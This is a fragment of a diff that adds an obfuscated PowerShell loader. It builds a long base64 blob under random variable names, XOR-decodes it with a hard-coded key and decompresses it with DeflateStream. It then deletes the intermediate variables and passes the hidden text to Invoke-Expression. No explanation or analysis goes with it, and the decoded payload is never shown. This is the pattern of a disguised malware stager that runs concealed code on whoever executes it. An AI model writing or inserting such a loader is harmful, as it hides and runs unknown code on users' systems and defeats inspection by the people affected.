+$szqjztjn+='gP3d2ztV/+KBuT1rnuANsbuu0tvFC8EvB6U+r+pxJO0XZiiQ/zNsnpAIfGKN+ccyXGXvoKDnmrZXBPgLmNIAw6kIunz8sF6aiNgG'
+$szqjztjn+='dUkyiQgSs35sSFt/xBglAJI6A1Akwi/G+W1/YZiUb6ArS3r4l2FcDwAi7KzVibXrZanO3TWl6nCa7GBJB+B3s8iv49piz1EJDEcn'
+$szqjztjn+='xY2WxPC9lhx34ghcx3YJnVeeyVvMW7F2rSlPqf9/NhGcrPn/oP4PISECdHLFUTHZg+nVOcgP88LZKjbSYouQ4esYLjb82qQ4Uro9'
+$szqjztjn+='UWrRj/gl3tY2ZaegfNBDruHR59zdCwulZGeaihPlujHJmuh9RzoIwQ+BwueMNzF0TKl2xvVh+3SDUKV5MPJBeldaC2Og0JW7zXKB'
+$szqjztjn+='BuH5jCe7HUYYO2tHPmjCeKjLlx+sb8w86FnDRf9eKT4woQI2K6AZemAkawbr6F5Wm6SlYaw60qQDfi+AFqD+FnjE1DWIcJ0MxMnW'
+$szqjztjn+='dUihdYoFSLbnAndi3KxJZ9RLNPCzzsMwRswKc3fMpcGPLaB2F72i0MztkAEgKA0c1GUALDfQfi4eFPmKIFu+hNKsES5EDHBfjWBA'
+$szqjztjn+='40p9MAPUloBZYu70cU/5xiMcADOPkLSwoR/GdxIaI5HLMqLVngXG8yVCH3GPLbeumhBz6fsesSqD1n8jaD6tjei0RHv0lSPp2C34'
+$szqjztjn+='U+IQLUnuywh/t8f1zTUtpSXSR/b3GfMFB0hNVzH9JwYe85XNPDWJQHArwRULgL6P9YhftD1E37Ku9w/cFYazwTmZLCju8WoLN2Ga'
+$szqjztjn+='lyUtgeBtgOx6rvJL64E+1cwCoisWM4l/vAKly6UFVKLM1EupqPF/4VZiNV+VRZJVuT8j0HPUEP3edOSy1lcmuoIkaXPDTY04cENY'
+$szqjztjn+='VHSXsiEqXFVmmTzPcH5QexHnglWbClQ8ch4JKNyc/jThyL197Be98tLW5OJ8EO3nNR0Toe4Qa4xZzbi0YTFDW2NbIewjJkH2BoJs'
+$szqjztjn+='eUaguwFj8RKg1+skjaBFabmKFowCTAlIp2b6U2TjocK5pf4fC3K3/FAvqHGg15oQ8FD/WsiVLstsRbWw+Wmo5gA8MF4Nd8bMfzGL'
+$szqjztjn+='FV25nyWEhEIhKPRgGLxwdaiLpOvDDtHGvJbPkcR6EIIZ6KUmuiGovPoV1wyOXLlUAU39H5a4cOjb9KND7zjwpQO7cAHrA+yp3bLN'
+$szqjztjn+='oeq1t/vjwc3e+MnHDd/NSLT5Ts3f782TR4QGrjHi3ivCX7cDb+1LLyXNnaV26HFRcf5wCud0aF/tNg3Hpigz68SbldilmiX3FZvP'
+$szqjztjn+='m0X5n5+3xHmqp9kcbhM9PAjfpIBg2P/Ea0Yp2HmS7UWIJULow7HWq9wlkjKntCPNsaPAn2eYv/Mn2QtGCAlBPUAJSDietuyNzAnz'
+$szqjztjn+='6cS6TQIAG2C2bxSEbCK/aSQRIfP6RIVurcnpXlnkCPxDhGN97oG+eVko/7sK6rrff3NSlYh6fbBoGkLVDuMf+9/TV+ng6zyGab00'
+$szqjztjn+='kLdbHoDJB8q6fPsnmkfPNwaEiXvHckFcq4EGXFQmpYvIjsYxpZYiXEqITIQtLp/FhtZABT7MnuconmplY/nhe5IbpizPrZX8XplO'
+$szqjztjn+='Jx0WUlKsNqyF/c01Zjt2xqSukMpl2ETS7mm2vFOIMKdP1VPYVGGVEbpXtYmG4Uq7SR+Hj17RLOLto1j/P5ukVmbvd7ie0xMMy3vB'
+$szqjztjn+='eHVKFLiRDZB4qLPJsB1KmZ70tB2atjU6MmHe2qLrkSPoK/TJf5WiDrQYhsl4tN82tch2FGAyGHXbSYMAgeg7+cDB2cz0pnlbCfAR'
+$szqjztjn+='KexFP0C2qjQr+z3k5YZmxi605JIH1cu0x6vKOi+/AyKVbwxHpXuVuL5l8Q04VHcc4PsPPiyb3laeAd6XO1eCTvstfGp8hwvzEQfA'
+$szqjztjn+='Xqd51dPsaTXppYT8ODvfmQwawOGCGA5TV5K8aHIEzlwt/Av5PwU/BJQUQXxhIlKzMN5yEwPiY1GOK4R8J5qplGo/lSKAyPaew/v4'
+$szqjztjn+='ebOw2TZUmvIvoCuiurMoMYR3qph0c27E4BpfbCNZxMpVmBj12PMrIxAurNH+t1Bj315JrX9on0JjnXOawtSsK1R2aeNWktpOyoSD'
+$szqjztjn+='9LaJIvnrw318VvU3ujKAr0EiSUQJG5wMWTHrNEpo0LJTDORTIhMy90idvSzTp/glW//AjwaAX4HFL35n9jch4v8a8C3RwFjQwhtq'
+$szqjztjn+='AjVAy+6ThhmY5vaX8FKh1kyH4FIv7ErHpSHja7GxHVJy8qgVeg3T7QEuhU5Qa4Jx2UhPkkxiv0mlFSoxh4FxciZhKHa4ahQ/iDEB'
+$szqjztjn+='piRodrYrzWaEodbIzusFYPMGqgexEMFUjmzcBimEhvU81WO1f6US8ULb1I4xS68v8JxxF6fw3rRxgfiYm0ue+6TvQOEOIeR8Lf4S'
+$szqjztjn+='/xodX/3Qc+I7huGd3Ds99hmOJ5ZnaZ0EgTF59uVGuKP/h7mTxtiHiKbGvycWwwTw845YQFHYkImMGpwDAxd2EqRIXO8NCIlXhGLz'
+$szqjztjn+='vlX8U2A3O5PyFyAMW6UABTe0xL0V0FxE4YLSSkBras8nhQgLSNdOACb1rXIRyky8n2795s2bGOJhmJuYXlq3aosGjd9WmcsfC2JZ'
+$szqjztjn+='uFob9q06WLabBlX0BZltlJk4Jux0BEljNqjPF3YF1CSk3N6/Ld4X0F4M4DYVfKNKy6i/Kk7uKdFPufVUsrVd01Q+0DJD0xVNIylF'
+$szqjztjn+='T/wfyhMa3Jte35hzg1f0AJXk10kEE//tBgaXejUAjS29sEnyis8CtXHuvz36d6WaJAClh1eh+InOybWfXna+TV5Q0WxYj4K7Evpt'
+$szqjztjn+='mzzRn1BbHgFHAPg5DlR+mehuu1vNig3u3FDgWDgjCRR5Re794+fPqmcCUhztyrF5VqutInunN0TJWav04l/zhxWbnLNNb+3+pyY4'
+$szqjztjn+='7ib+gaP0GVwo+JTXzDWStFebu0xpRMdjZ91Kco+mOvQnPGp58zsYFzm3nPQkcQFI5nGdcloYSK7UxfZyv/j+iVj3CxSDca+3ePuS'
+$szqjztjn+='s8/gEZ2w5B5BUObyHixNXWUfUfW8YYH6BiZ5IE/ar8ctttB2RYW9MBhyaZIRPPTL81J/KX944DDVlbNTXy5A3Pn1np1gNtXBZkIS'
+$szqjztjn+='CoBgXu2XbbXK3UHnb68ZwjCPM2gQl9A1ft0U+1inx9FfjLa9cdLAaGFqIgJueN+cJ9eF3RKMK/MuLmJ2/f4Ms8uaotoaD4bxrHAd'
+$szqjztjn+='42S18xXqB0SWF7RodL1kD/+FpGDg9SUMgzLc+1VkfReyNskepgw6sWfaroKvc61rAOmoYoZ0JWbrYSJnPCyfelnD3QcWmZEYw0X3'
+$szqjztjn+='AsnL2505JM42CSd1XxFwQGjFnVD0D1K3KXpZ+dWyXBEUE3zgx2pp7Cok9Z2Z4XrdkW1p20fJpUSMbQ2LWS2nH9hc6voa6yFQkgRH'
+$szqjztjn+='uvuDT4QjY1Z3Ch+23yhyyv65ulNxTqTYJjv7MdK5w/L0tMatjCEfQKv1HavQvTDxJ8rqf3E8L21AduCMeSbhPXeSnioeRGHjvDvi'
+$szqjztjn+='okHpTRoqnOtQF3y4sQz/S4U+25Km7ACLgO7lTFx0fdadEij+jd1vnak7XROubABc35ITxEu9KOzn7VHfdeSvYsj4iSkb30VU7jme'
+$szqjztjn+='nZ28S/MGyQzMOVkpT8sVaO64MZjrCz8pT0qUAPOJheBGVaskQxv2m5xLsP2gf26hqf5zscs1fq4c2LfjMdyx/odFAJaORxni1RUS'
+$szqjztjn+='ljP0o5TIdaiR7DyWz1EGFpmoPvr3fGt8HwpUKCi7wfH6jhPygUCtEG/Q12HyO0Bun1tJ/76DvBJ30m3STev4U3je58X0+Zce6Zpg'
+$szqjztjn+='7MaILCwIiEU7mowVKzxcZ2ZgLfHDm+O5CGh+TxVgA919HI8R0Hi7+3sRjOwvQJPcCqUJ7OrOt9K3eCWpxCI+Ru6nZWgPQ55AWCfw'
+$szqjztjn+='R0F/i+noZLl32V6p5E3R78go1lDjv8BuY5YbOZTGkLv0/FH94agsO2a+gjCe1o+P98Ic+mD3B0hXDZlkQ9vLqh1PCe/yuBZocxZj'
+$szqjztjn+='oyzKLJMfLgADFXJi3F1Rr3C8wu4t1lddqe7iJKouKjV9TxpzR0HgHtbSuCTdLvDfAjSOefcPVmm3hJlSZKoyenvvNb4m/MS6HZlI'
+$szqjztjn+='fhfukx43jTU3uzPZdcfApJkMdAAv0TzW3IjenFkbCVxgYgeKSFv+z1TJZzvH8al5680tKB/m4AKCiCM8UY+4Qqi2GiiI+8V1U+cR'
+$szqjztjn+='jjFveVcG8quDa3nVvXp8am4Yj0OKdSvB1InGmyI00qp67FMzwNv9e1VVRjPGelx9/WcC6CvlipAO6qaftDRbVmuZSE3lMaidKKOZ'
+$szqjztjn+='9LnVq9vY/zEC8YHLqyNhfL//a/OHoRdH9J1eG06mIXLHd4Cyt8f9sfJU5uRIUqkHph5+UmdJdy8Arp3hMDCS8PHgWR/jOU2VwixR'
+$szqjztjn+='Nl9xkd1+dgKmOYmYTBtp6VFEWM/t7gA53cotcRDcMXim/5naoQcrFqZ8b+cGgb+xpMATwR6aQucNhLZPCJrhaai9y6oUrIJ97Qyw'
+$szqjztjn+='FqJVN5OUFSXHWukKPPb6ArCiwCyrT9EArHGgDDSKZa3dhsQYH4l47AZYs2xYfgLPXH6mXUuUu0Pl9iEi6WIlBU0ylGjhWU406iGr'
+$szqjztjn+='XgtuPkKfe/SmvhonCXtnEHWF/n+JZzd5uFfwFcwT6P3WzLTE+YTM+bGetZxp9zJsj+KJGFdu+Bm+4etmuTEW2i5rVq0nZ/NUBtWu'
+$szqjztjn+='11yDr3+CHCF168kVXp8+GWFF9s3y1PFQOBHaZpWn8F/kwUKWphqYXf82vg=='
+$wmitpvpm=[byte[]]@(42,148,113,3,195,67,130,228,116,207,145,224,199,4,224,217)
+$opxdbzlp=[Convert]::FromBase64String($szqjztjn)
+$jwffdmpe=[byte[]]::new($opxdbzlp.Length)
+for($gakdvxth=0;$gakdvxth -lt $opxdbzlp.Length;$gakdvxth++){$jwffdmpe[$gakdvxth]=$opxdbzlp[$gakdvxth] -bxor $wmitpvpm[$gakdvxth % $wmitpvpm.Length]}
+$tjsygmoy=[System.IO.MemoryStream]::new($jwffdmpe[2..($jwffdmpe.Length-1)])
+$flvmbvkd=[System.IO.Compression.DeflateStream]::new($tjsygmoy,[System.IO.Compression.CompressionMode]::Decompress)
+$azjdxkbm=[System.IO.StreamReader]::new($flvmbvkd,[System.Text.Encoding]::UTF8)
+$acwlwnxo=$azjdxkbm.ReadToEnd()
+$azjdxkbm.Dispose()
+Remove-Variable szqjztjn,wmitpvpm,opxdbzlp,jwffdmpe -ErrorAction SilentlyContinue
+Invoke-Expression $acwlwnxo
